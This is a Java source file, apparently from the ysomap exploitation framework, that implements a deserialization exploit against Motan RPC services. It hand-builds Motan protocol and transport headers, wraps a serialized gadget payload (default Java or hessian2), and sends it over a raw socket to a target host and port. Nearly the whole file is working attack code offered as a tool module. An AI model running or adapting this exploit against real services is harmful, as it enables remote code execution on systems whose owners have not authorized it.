package ysomap.exploits.motan;

import org.apache.commons.codec.DecoderException;
import ysomap.common.annotation.*;
import ysomap.common.util.Status;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.ByteHelper;
import ysomap.core.util.SocketHelper;
import ysomap.exploits.AbstractExploit;
import ysomap.payloads.Payload;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;

/**
 * @author wh1t3p1g
 * @since 2021/11/12
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {}, param = false)
@Details("motan rpc 反序列化漏洞")
public class MotanRPCExploit extends AbstractExploit {

    @NotNull
    @Require(name = "host", detail = "目标IP")
    public String host = null;

    @NotNull
    @Require(name = "port", type = "int",detail = "目标端口")
    public String port = "12200";

    @NotNull
    @Require(name = "serializerType", detail = "序列化方法，有default和hessian2两种")
    public String serializerType = "hessian2";

    @NotNull
    public Payload payload;
    public String payloadName;

    @Override
    public void work() {
        Serializer serializer = SerializerFactory.createSerializer(serializerType);
        try {
            Object payloadData = null;
            if("default".equals(serializerType)){
                payloadData = payload.getObject();
            }else{
                payloadData = serializer.serialize(payload);
            }
            byte[] data = generate(payloadData , serializerType);
            System.out.println(data.length);
            SocketHelper.send(host, Integer.parseInt(port), data, 5000);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stop() {
        setStatus(Status.STOPPED);
    }

    enum RequestFlag {

        Request(0),
        Response(1);

        private byte code;

        RequestFlag(int code){
            this.code=(byte)code;
        }

        public byte getCode() {
            return code;
        }
    }

    enum RpcProtocolVersion {
        VERSION_1((byte) 1, 16), VERSION_1_Compress((byte) 2, 16), VERSION_2((byte) 3, 13);//

        private byte version;
        private int headerLength;

        RpcProtocolVersion(byte version, int headerLength) {
            this.version = version;
            this.headerLength = headerLength;
        }

        public byte getVersion() {
            return version;
        }

        public int getHeaderLength() {
            return headerLength;
        }

    }

    private static byte[] encode(byte[] body, byte flag, long requestId) throws IOException {
        byte[] header = new byte[RpcProtocolVersion.VERSION_1.getHeaderLength()];
        int offset = 0;

        // 0 - 15 bit : magic
        ByteHelper.short2bytes((short) 0xF0F0, header, offset);
        offset += 2;

        // 16 - 23 bit : version
        header[offset++] = RpcProtocolVersion.VERSION_1.getVersion();

        // 24 - 31 bit : extend flag
        header[offset++] = flag;

        // 32 - 95 bit : requestId
        ByteHelper.long2bytes(requestId, header, offset);
        offset += 8;

        // 96 - 127 bit : body content length
        ByteHelper.int2bytes(body.length, header, offset);

        byte[] data = new byte[header.length + body.length];

        System.arraycopy(header, 0, data, 0, header.length);
        System.arraycopy(body, 0, data, header.length, body.length);
        // transport
        byte[] transportHeader = new byte[16];
        ByteHelper.short2bytes((short) 0xF1F1, transportHeader, 0);
        transportHeader[3] = RequestFlag.Request.code;
        ByteHelper.long2bytes(requestId, transportHeader, 4);
        ByteHelper.int2bytes(data.length, transportHeader, 12);
        // transport header + data
        return ByteHelper.combine(transportHeader, data);
    }

    public static byte[] generate(Object payload, String serializerType) throws IOException, DecoderException {
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        ObjectOutput output = new ObjectOutputStream(outputStream);
        output.writeUTF("y");
        output.writeUTF("m");
        output.writeUTF("java.lang.Object");

        output.writeObject(payload); // hessian2 payload byte[]; default payload obj;
        output.writeInt(0); // empty attachments

        output.flush();
        byte[] body = outputStream.toByteArray();
        output.close();
        return encode(body, RequestFlag.Request.code, 1);
    }
}
